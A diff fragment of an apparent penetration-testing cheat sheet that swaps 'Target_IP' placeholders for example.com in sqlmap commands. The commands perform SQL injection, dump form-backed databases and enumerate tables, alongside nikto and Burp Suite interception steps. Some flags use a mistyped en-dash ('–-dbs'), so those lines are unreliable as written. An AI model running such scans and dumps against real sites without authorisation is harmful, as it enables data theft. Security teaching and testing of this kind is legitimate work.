@@ -64,11 +64,11 @@ $ nikto -h http://example.com:8080/ -id user:password
 
 # 3° Web-Site-DB Scan SQLMap/Burp Suite/ZAP
 
-$ sqlmap -u http://Target_IP/login.php --forms --dump
+$ sqlmap -u http://example.com/login.php --forms --dump
 
-$ sqlmap -u http://Target_IP/listproducts.php?cat=1 –-dbs
+$ sqlmap -u http://example.com/listproducts.php?cat=1 –-dbs
 
-$ sqlmap -u  http://Target_IP/listproducts.php?cat=1 –-dbs -D products –-tables
+$ sqlmap -u  http://example.com/listproducts.php?cat=1 –-dbs -D products –-tables
 
 Burp Suite > Proxy > Intercept > Open Browser > Intercept on
 
